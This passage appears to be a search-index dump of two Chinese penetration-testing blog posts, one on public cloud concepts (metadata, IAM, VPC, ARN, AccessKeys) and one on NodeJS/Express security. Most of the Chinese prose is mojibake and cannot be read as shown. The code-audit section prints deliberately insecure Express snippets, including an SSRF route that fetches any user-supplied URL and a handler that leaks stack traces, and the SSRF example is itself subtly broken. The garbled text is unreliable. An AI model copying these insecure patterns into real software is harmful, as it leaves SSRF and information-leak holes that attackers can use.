æœåŠ¡èƒ½å¤Ÿå‘è™šæœºæä¾›ä¸»æœºåï¼Œssh å…¬é’¥ï¼Œç”¨æˆ·ä¼ å…¥çš„ä¸€äº›å®šåˆ¶æ•°æ®ç­‰å…¶ä»–ä¿¡æ¯ã€‚è¿™äº›æ•°æ®è¢«åˆ†ä¸ºä¸¤ç±»ï¼šmetadata å’Œ user dataï¼Œmetadata ä¸»è¦åŒ…æ‹¬è™šæœºè‡ªèº«çš„ä¸€äº›æ•°æ®æ¯”å¦‚ hostnameã€ssh ç§˜é’¥ã€ç½‘ç»œé…ç½®ç­‰ï¼Œè€Œ user data ä¸»è¦åŒ…æ‹¬ä¸€äº›å®šåˆ¶çš„è„šæœ¬ã€å‘½ä»¤ç­‰ã€‚ä½†æ˜¯ä¸ç®¡æ˜¯å“ªä¸€ç§æ•°æ®ï¼Œopenstack å‘è™šæœºæä¾›æ•°æ®çš„æ–¹å¼æ˜¯ä¸€è‡´çš„ã€‚ Tips å¯ä»¥ç±»æ¯” docker file ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:1","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 å¯ç”¨åŒº - Available Zone å’ŒåŒºåŸŸ - Region å…ˆæ¥çœ‹ä¸€ä¸‹åŒºåŸŸï¼ˆRegionï¼‰æ¦‚å¿µã€‚AWS äº‘æœåŠ¡åœ¨å…¨çƒä¸åŒçš„åœ°æ–¹éƒ½æœ‰æ•°æ®ä¸­å¿ƒï¼Œæ¯”å¦‚åŒ—ç¾ã€å—ç¾ã€æ¬§æ´²å’Œäºšæ´²ç­‰ã€‚ä¸æ­¤å¯¹åº”ï¼Œæ ¹æ®åœ°ç†ä½ç½®æˆ‘ä»¬æŠŠæŸä¸ªåœ°åŒºçš„åŸºç¡€è®¾æ–½æœåŠ¡é›†åˆç§°ä¸ºä¸€ä¸ªåŒºåŸŸã€‚é€šè¿‡ AWS çš„åŒºåŸŸï¼Œä¸€æ–¹é¢å¯ä»¥ä½¿å¾— AWS äº‘æœåŠ¡åœ¨åœ°ç†ä½ç½®ä¸Šæ›´åŠ é è¿‘æˆ‘ä»¬çš„ç”¨æˆ·ï¼Œå¦ä¸€æ–¹é¢ä½¿å¾—ç”¨æˆ·å¯ä»¥é€‰æ‹©ä¸åŒçš„åŒºåŸŸå­˜å‚¨ä»–ä»¬çš„æ•°æ®ä»¥æ»¡è¶³æ³•è§„éµå¾ªæ–¹é¢çš„è¦æ±‚ ä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼š ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:2","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 IAM - Identify and Access Management å¯å¸®åŠ©ä½ å®‰å…¨åœ°æ§åˆ¶ç”¨æˆ·å¯¹ AWS èµ„æºçš„è®¿é—®æƒé™ã€‚é€šè¿‡ IAM å¯ä»¥æ§åˆ¶å“ªäº›äººå¯ä»¥ä½¿ç”¨ä½ çš„ AWS èµ„æº(èº«ä»½éªŒè¯)ä»¥åŠä»–ä»¬å¯ä»¥ä½¿ç”¨çš„èµ„æºå’Œé‡‡ç”¨çš„æ–¹å¼(æˆæƒ)ã€‚ IAM-AWS RAM-é˜¿é‡Œäº‘ CAM-è…¾è®¯äº‘ IAM-åä¸ºäº‘ 2.3.1 ç”¨æˆ· å¦‚æœæ‚¨è´­ä¹°äº†å¤šå°äº‘æœåŠ¡å™¨ ECS å®ä¾‹ï¼Œæ‚¨çš„ç»„ç»‡é‡Œæœ‰å¤šä¸ªç”¨æˆ·ï¼ˆå¦‚å‘˜å·¥ã€ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºï¼‰éœ€è¦ä½¿ç”¨è¿™äº›å®ä¾‹ï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªç­–ç•¥å…è®¸éƒ¨åˆ†ç”¨æˆ·ä½¿ç”¨è¿™äº›å®ä¾‹ã€‚é¿å…äº†å°†åŒä¸€ä¸ª AccessKey æ³„éœ²ç»™å¤šäººçš„é£é™©ã€‚ 2.3.2 ç”¨æˆ·ç»„ æ‚¨å¯ä»¥åˆ›å»ºå¤šä¸ªç”¨æˆ·ç»„ï¼Œå¹¶æˆäºˆä¸åŒæƒé™ç­–ç•¥ï¼Œèµ·åˆ°æ‰¹é‡ç®¡ç†çš„æ•ˆæœã€‚ä¾‹å¦‚ï¼š ä¸ºäº†åŠ å¼ºç½‘ç»œå®‰å…¨æ§åˆ¶ï¼Œæ‚¨å¯ä»¥ç»™æŸä¸ªç”¨æˆ·ç»„æˆæƒä¸€ä¸ªæƒé™ç­–ç•¥ï¼Œè¯¥ç­–ç•¥å¯ä»¥è§„å®šï¼šå¦‚æœç”¨æˆ·çš„ IP åœ°å€ä¸æ˜¯æ¥è‡ªä¼ä¸šç½‘ç»œï¼Œåˆ™æ‹’ç»æ­¤ç±»ç”¨æˆ·è¯·æ±‚è®¿é—®ç›¸å…³ ECS èµ„æºã€‚ æ‚¨å¯ä»¥åˆ›å»ºä»¥ä¸‹ä¸¤ä¸ªç”¨æˆ·ç»„ç®¡ç†ä¸åŒå·¥ä½œèŒè´£çš„äººå‘˜ï¼Œå¦‚æœæŸå¼€å‘äººå‘˜çš„å·¥ä½œèŒè´£å‘ç”Ÿè½¬å˜ï¼Œæˆä¸ºä¸€åç³»ç»Ÿç®¡ç†äººå‘˜ï¼Œæ‚¨å¯ä»¥å°†å…¶ä» Developers ç”¨æˆ·ç»„ç§»åˆ° SysAdmins ç”¨æˆ·ç»„ã€‚ SysAdminsï¼šè¯¥ç”¨æˆ·ç»„éœ€è¦åˆ›å»ºå’Œç®¡ç†çš„æƒé™ã€‚æ‚¨å¯ä»¥ç»™ SysAdmins ç»„æˆäºˆä¸€ä¸ªæƒé™ç­–ç•¥ï¼Œè¯¥ç­–ç•¥æˆäºˆç”¨æˆ·ç»„æˆå‘˜æ‰§è¡Œæ‰€æœ‰ ECS æ“ä½œçš„æƒé™ï¼ŒåŒ…æ‹¬ ECS å®ä¾‹ã€é•œåƒã€å¿«ç…§å’Œå®‰å…¨ç»„ç­‰ã€‚ Developersï¼šè¯¥ç”¨æˆ·ç»„éœ€è¦ä½¿ç”¨å®ä¾‹çš„æƒé™ã€‚æ‚¨å¯ä»¥ç»™ Developers ç»„æˆäºˆä¸€ä¸ªæƒé™ç­–ç•¥ï¼Œè¯¥ç­–ç•¥æˆäºˆç”¨æˆ·ç»„æˆå‘˜è°ƒç”¨ DescribeInstancesã€StartInstanceã€StopInstanceã€RunInstance å’Œ DeleteInstance ç­‰æƒé™ã€‚ 2.3.3 è§’è‰² å®ä¾‹ RAM è§’è‰²å…è®¸æ‚¨å°†ä¸€ä¸ªè§’è‰²å…³è”åˆ° ECS å®ä¾‹ï¼Œåœ¨å®ä¾‹å†…éƒ¨åŸºäºSTSï¼ˆSecurity Token Serviceï¼‰ä¸´æ—¶å‡­è¯è®¿é—®å…¶ä»–äº‘äº§å“çš„ APIï¼Œä¸´æ—¶å‡­è¯å°†å‘¨æœŸæ€§æ›´æ–°ã€‚å³å¯ä»¥ä¿è¯äº‘è´¦å· AccessKey å®‰å…¨ï¼Œè¿˜å¯ä»¥å€ŸåŠ©è®¿é—®æ§åˆ¶ RAM å®ç°ç²¾ç»†åŒ–æ§åˆ¶å’Œæƒé™ç®¡ç†ã€‚ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:3","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.4 VPC - Virtual Private Cloud ä¸“æœ‰ç½‘ç»œ VPC å…è®¸ç”¨æˆ·åœ¨äº‘ä¸Šæ„å»ºå‡ºä¸€ä¸ªé€»è¾‘éš”ç¦»åˆ†åŒºï¼Œè®©ç”¨æˆ·åœ¨è‡ªå·±å®šä¹‰çš„è™šæ‹Ÿç½‘ç»œä¸­åˆ›å»ºå¹¶è¿è¡Œæ–°ç½‘çš„èµ„æºã€‚ç”¨æˆ·å¯ä»¥å®Œå…¨æŒæ§æ‚¨çš„è™šæ‹Ÿç½‘ç»œç¯å¢ƒï¼ŒåŒ…æ‹¬é€‰æ‹© IP åœ°å€èŒƒå›´ï¼Œåˆ›å»ºå­ç½‘å’Œé…ç½®è·¯ç”±è¡¨ç­‰ã€‚ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:4","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.5 ARN - Aliyun Resource Name èµ„æº ARN çš„æ ¼å¼ä¸º: arn:acs:${Service}:${Region}:${Account}:${ResourceType}/${ResourceId} å„å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼š Serviceï¼šäº‘äº§å“codeã€‚ Regionï¼šåœ°åŸŸIDã€‚ Accountï¼šé˜¿é‡Œäº‘è´¦å·IDã€‚ ResourceTypeï¼šèµ„æºç±»å‹ã€‚ ResourceIdï¼šèµ„æºIDã€‚ arn:acs:ecs:cn-hangzhou:123456789\\*\\*\\*\\*:instance/i-xxxxxxxxxxxxxx å‚è€ƒï¼š https://help.aliyun.com/document_detail/172061.html?spm=5176.10695662.1996646101.searchclickresult.b8ae1b9ejjB6pU ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:5","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.6 Access Key \u0026 Access Secret Key è®¿é—®å¯†é’¥ AccessKeyï¼ˆAKï¼‰ç›¸å½“äºç™»å½•å¯†ç ï¼Œåªæ˜¯ä½¿ç”¨åœºæ™¯ä¸åŒã€‚AccessKey ç”¨äºç¨‹åºæ–¹å¼è°ƒç”¨äº‘æœåŠ¡ APIï¼Œè€Œç™»å½•å¯†ç ç”¨äºç™»å½•æ§åˆ¶å°ã€‚ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:6","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.7 æ¶æ„å›¾ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:7","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 å…¬æœ‰äº‘ä¿¡æ¯æ”¶é›† ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:3:0","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.1 è¯†åˆ«å’Œå‘ç°äº‘äº§å“ äº§å“çš„å…³é”®å­— è¯†åˆ«äº§å“åŒºåŸŸ ä¸»åŠ¨ FUZZ / è¢«åŠ¨å‘ç°ç›¸è¾…ç›¸æˆ ç”²æ–¹è§†è§’å‘ç° åŸç”Ÿæ¼æ´è¿˜æ˜¯å­˜åœ¨ï¼Œæ¯”å¦‚ Hadoop æ¼æ´è¿˜æ˜¯å­˜åœ¨ï¼ŒRDS å¼±å£ä»¤è¿˜æ˜¯æœ‰ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:3:1","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"NodeJS å®‰å…¨","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"NodeJS å®‰å…¨ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:0:0","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 NodeJS åŸºç¡€ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:0","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 å®šä¹‰ä¸åŸç† æ˜¯ä¸€ä¸ªå¼€æºçš„ã€è·¨å¹³å°çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œæœ‰äº†å®ƒï¼Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨ JavaScript åˆ›å»ºå„ç§æœåŠ¡å™¨ç«¯å·¥å…·å’Œåº”ç”¨ç¨‹åºã€‚æ­¤è¿è¡Œæ—¶è¦ç”¨äºæµè§ˆå™¨ä¸Šä¸‹æ–‡ä¹‹å¤–(å³å¯ä»¥ç›´æ¥è¿è¡Œäºè®¡ç®—æœºæˆ–æœåŠ¡å™¨æ“ä½œç³»ç»Ÿä¸Š)ã€‚ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:1","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 å¸¸è§æ¡†æ¶ Express æ˜¯æœ€æµè¡Œçš„ Node æ¡†æ¶ï¼Œæ˜¯è®¸å¤šå…¶å®ƒæµè¡Œ Node æ¡†æ¶çš„åº•å±‚åº“ã€‚è™½ç„¶ Express æœ¬èº«æ˜¯æç®€é£æ ¼çš„ï¼Œä½†æ˜¯å¼€å‘äººå‘˜é€šè¿‡åˆ›å»ºå„ç±»å…¼å®¹çš„ä¸­é—´ä»¶åŒ…è§£å†³äº†å‡ ä¹æ‰€æœ‰çš„ web å¼€å‘é—®é¢˜ã€‚è¿™äº›åº“å¯ä»¥å®ç° cookieã€ä¼šè¯ã€ç”¨æˆ·ç™»å½•ã€URL å‚æ•°ã€POST æ•°æ®ã€å®‰å…¨å¤´ç­‰åŠŸèƒ½ã€‚ ç‰¹ç‚¹ï¼š ä¸ºä¸åŒ URL è·¯å¾„ä¸­ä½¿ç”¨ä¸åŒ HTTP åŠ¨è¯çš„è¯·æ±‚(è·¯ç”±)ç¼–å†™å¤„ç†ç¨‹åºã€‚ é›†æˆäº†ã€Œè§†å›¾ã€æ¸²æŸ“å¼•æ“ï¼Œä»¥ä¾¿é€šè¿‡å°†æ•°æ®æ’å…¥æ¨¡æ¿æ¥ç”Ÿæˆå“åº”ã€‚ è®¾ç½®å¸¸è§ Web åº”ç”¨è®¾ç½®ï¼Œæ¯”å¦‚ç”¨äºè¿æ¥çš„ç«¯å£ï¼Œä»¥åŠæ¸²æŸ“å“åº”æ¨¡æ¿çš„ä½ç½®ã€‚ åœ¨è¯·æ±‚å¤„ç†ç®¡é“çš„ä»»ä½•ä½ç½®æ·»åŠ é¢å¤–çš„è¯·æ±‚å¤„ç†ã€Œä¸­é—´ä»¶ã€ã€‚ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:2","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.3 Node ç¯å¢ƒ 1.3.1 åŸºç¡€ç¯å¢ƒ ä¸‹è½½åœ°å€ï¼šhttps://nodejs.org/en/ ä» HelloWorld ç¨‹åºå¼€å§‹ const http = require('http'); http.createServer((req, res)=\u003e{ res.writeHead(200, {'Content-Type': 'text/plain'}); res.end(\"Hello World\\n\"); }).listen(80); 1.3.2 Express ç¯å¢ƒç®€ä»‹ å®‰è£… npm install express ä» HelloWorld ç¨‹åºå¼€å§‹ const express = require('express'); const app = express(); app.get('/hello', (req, res) =\u003e { res.send(\"Hello World\"); }); app.listen(80, () =\u003e { console.log(\"listen on 80\"); }); ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:3","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 Express åŠå…¶ç»„ä»¶ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:0","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 è·¯ç”±æ¨¡å— è·¯ç”±çš„ä½œç”¨å°±æ˜¯è§£æ URLï¼Œè°ƒç”¨å¯¹åº”çš„æ§åˆ¶å™¨ï¼ˆçš„æ–¹æ³•ï¼Œå¹¶ä¼ é€’å‚æ•°ï¼‰ã€‚ å®¢æˆ·ç«¯çš„è¯·æ±‚æ˜¯ä»¥ URL çš„å½¢å¼ä¼ é€’ç»™æœåŠ¡å™¨çš„ã€‚ä¼ ç»Ÿ WEB å¼€å‘ä¸­ï¼ŒURL å¯¹åº”æœåŠ¡å™¨ä¸ŠæŸä¸ªç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶ã€‚MVC å¼€å‘åˆ™æ”¹å˜äº†è¿™ç§å¯¹åº”å…³ç³»ï¼ŒWEB æœåŠ¡å™¨ä¼šæˆªè·æ‰€æœ‰è¯·æ±‚ï¼Œä¸åšèµ„æºå­˜åœ¨æ€§æ£€æŸ¥ï¼Œç›´æ¥è½¬å‘ç»™ç½‘ç«™çš„è·¯ç”±ç¨‹åºã€‚ è·¯ç”±å™¨å†è°ƒç”¨ç›¸å…³çš„æ§åˆ¶å™¨ã€‚æ§åˆ¶å™¨è°ƒç”¨ç›¸å…³çš„æœåŠ¡ï¼Œå¹¶è¿”å›è§†å›¾å¯¹è±¡ã€‚è·¯ç”±å™¨å†ä»è§†å›¾å¯¹è±¡ä¸­æå–ç”Ÿæˆå¥½çš„ç½‘é¡µä»£ç è¿”å›ç»™ Web æœåŠ¡å™¨ï¼Œæœ€ç»ˆè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ ä¸¾ä¾‹ï¼š download.js const express = require('express'); const router = express.Router(); router.get('/', (req, res) =\u003e { res.send('download page'); }); router.get('/docs', (req, res) =\u003e { res.send('download page docs'); }); module.exports = router; main.js const express = require('express'); const app = express(); const download = require(__dirname + \"/download.js\"); app.use('/download', download); app.get('/', (req, res) =\u003e { res.send(\"Hello World\"); }); app.get('/news', (req, res) =\u003e { res.send(\"news page\"); }); app.listen(80, () =\u003e { console.log('listen on 80'); }); app.use è¡¨ç¤ºå¯¹æ‰€æœ‰è·¯ç”±ï¼Œå’Œæ‰€æœ‰æ–¹æ³•éƒ½è°ƒç”¨ä¸­é—´å‡½æ•° app.get (â€™/â€™)è¡¨ç¤ºå¯¹ get æ–¹æ³•å¼€å¤´çš„ URL è°ƒç”¨ä¸­é—´å‡½æ•° app.use(â€™/downloadâ€™) è¡¨ç¤ºå¯¹ /download å¤´çš„æ‰€æœ‰ï¼Œè°ƒç”¨ä¸­é—´å‡½æ•°ã€‚ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:1","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 ä¸­é—´ä»¶ ä¸­é—´ä»¶åœ¨ Express åº”ç”¨ä¸­å¾—åˆ°äº†å¹¿æ³›ä½¿ç”¨ã€‚å¤§å¤šæ•°åº”ç”¨ä¼šä½¿ç”¨ç¬¬ä¸‰æ–¹ä¸­é—´ä»¶æ¥ç®€åŒ–å¸¸è§çš„ web å¼€å‘ä»»åŠ¡ï¼Œæ¯”å¦‚ cookieã€ä¼šè¯ã€ç”¨æˆ·èº«ä»½éªŒè¯ã€è®¿é—®è¯·æ±‚ POST å’Œ JSON æ•°æ®ï¼Œæ—¥å¿—è®°å½•ã€å‹ç¼© HTTP å“åº”ç­‰ç­‰ã€‚ ä¸€äº›ä¸­é—´ä»¶çš„å¼•å…¥é¡ºåºå¾ˆé‡è¦(ä¾‹å¦‚ï¼Œå¦‚æœä¼šè¯ä¸­é—´ä»¶ä¾èµ–äº cookie ä¸­é—´ä»¶ï¼Œåˆ™å¿…é¡»å…ˆæ·»åŠ  cookie å¤„ç†å™¨)ã€‚ç»å¤§å¤šæ•°æƒ…å†µä¸‹è¦å…ˆè°ƒç”¨ä¸­é—´ä»¶åè®¾ç½®è·¯ç”±ï¼Œå¦åˆ™è·¯ç”±å¤„ç†å™¨å°†æ— æ³•è®¿é—®ä¸­é—´ä»¶çš„åŠŸèƒ½ã€‚morgan æ˜¯ä¸€ä¸ªæ—¥å¿—è®°å½•çš„ä¸­é—´ä»¶ã€‚ const express = require('express'); const app = express(); const download = require(__dirname + \"/download.js\"); const logger = require(\"morgan\"); app.use(logger('dev')); app.listen(80, () =\u003e { console.log('listen on 80'); }); app.use('/download', download); app.get('/', (req, res) =\u003e { res.send(\"Hello World\"); }); app.get('/news', (req, res) =\u003e { res.send(\"news page\"); }); ä¸­é—´ä»¶å’Œè·¯ç”±å‡½æ•°æ˜¯æŒ‰ç…§å£°æ˜é¡ºåºè°ƒç”¨çš„ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:2","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 æ¸²æŸ“ PUG æ¨¡æ¿å¼•æ“æ˜¯ä¸€æ¬¾å¥å£®ã€çµæ´»ã€åŠŸèƒ½ä¸°å¯Œçš„ HTML æ¨¡æ¿å¼•æ“ä¸“é—¨ä¸º Node å¹³å°å¼€å‘ã€‚ PUG æ˜¯ç”± Jade æ”¹åè€Œæ¥ã€‚ Pug é€šè¿‡ç¼©è¿›(è¡¨ç¤ºæ ‡ç­¾é—´çš„åµŒå¥—å…³ç³»)çš„æ–¹å¼æ¥ç¼–å†™ä»£ç çš„è¿‡ç¨‹ï¼Œåœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ï¼Œä¸éœ€è¦è€ƒè™‘æ ‡ç­¾æ˜¯å¦é—­åˆçš„é—®é¢˜ã€‚ pugDemoï¼š const express = require('express'); const app = express(); const path = require(\"path\"); app.listen(80, () =\u003e { console.log(\"listening on 80\"); }); app.set(\"views\", path.join(__dirname, 'views')); app.set('view engine', 'pug'); app.get('/', function(req, res) { res.render('index', {title: 'Hello', message: 'hello world pug engine'}) }) views/index.pug html head title=title body h1=message ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:3","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 å¨èƒåˆ†æ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:0","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.1 å¸¸è§æ¼æ´ ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œï¼ŒXSSï¼ŒSQL æ³¨å…¥ï¼ŒSSRFï¼Œæ–‡ä»¶ä¸Šä¼  nodejs å¯¹ä¸€äº›ç»å…¸ web æ¼æ´ï¼Œæœ‰ä¸€å®šé˜²æŠ¤ï¼Œæœ‰çš„æ¼æ´åœ¨å…¶ä»–è¯­è¨€ä¸­ä¸æ˜æ˜¾ã€‚ä½†åœ¨ nodejs ä¸­æ¯”è¾ƒçªå‡ºã€‚ require é“¾åŠ«æŒ(è½¯ä»¶æŠ•æ¯’)ï¼Œæ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡(ReDoS)ï¼Œä¸å®‰å…¨çš„åŒ…ã€‚ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:1","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.2 ä»£ç å®¡è®¡ 3.2.1 é¡¹ç›®ç»“æ„ 3.2.2 å®¡è®¡ä¾èµ– nsp æ˜¯æ£€æµ‹åŒ…ä¾èµ–çš„å·¥å…·ï¼Œè¢«æ”¶è´­åï¼Œåœ¨ npm \u003e= 6.0.0ï¼Œä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ï¼š npm audit npm audit fix 3.2.3 ä¸å®‰å…¨çš„å¯¹è±¡ç›´æ¥å¼•ç”¨ function isAdmin(req, res, next) { if(req.user.role == \"admin\") // æ£€æµ‹è´¦å·ç”¨æˆ·æ˜¯å¦æ˜¯ admin return next(); // å¦‚æœä¸æ˜¯ï¼ŒæŠ¥é”™ res.redirect('/403'); } app.get('/admin', isAdmin, function(req, res) { res.send('secret'); }); 3.2.4 æ•æ„Ÿä¿¡æ¯æ³„éœ² app.use(function(err, req, res, next) { res.status(500).send(err.stack); }) 3.2.5 æœªç»éªŒè¯çš„é‡å®šå‘å’Œè½¬å‘ SSRF app.use('/redirect', function(req, res) { request(req.query.url, function(error, response, body){ if(err) { return res.send(body); } }) }) ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:2","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.3 å®‰å…¨é…ç½® Helmet Strict-Transport-Security å¼ºåˆ¶å®æ–½ä¸æœåŠ¡å™¨çš„å®‰å…¨ (http over SSL / TLS)è¿æ¥ X-Frame-Options æä¾›ç‚¹å‡»åŠ«æŒä¿æŠ¤ XSS-Protection æ”¯æŒåœ¨æœ€æ–°çš„ Web æµè§ˆå™¨ä¸­å†…ç½®çš„è·¨ç«™ç‚¹è„šæœ¬(XSS)è¿‡æ»¤å™¨ X-Content-Type-Options å¯é˜²æ­¢æµè§ˆå™¨ä»å£°æ˜çš„å†…å®¹ç±»å‹ä¸­å—…æ¢å“åº” Content-Security-Policy å¯é˜²æ­¢å„ç§æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™ç‚¹è„šæœ¬å’Œå…¶ä»–è·¨ç«™ç‚¹æ³¨å…¥ ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:3:3","tags":["æ¸—é€æµ‹è¯•","NodeJS"],"title":"NodeJS å®‰å…¨","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4 å¸¸è§é—®é¢˜ 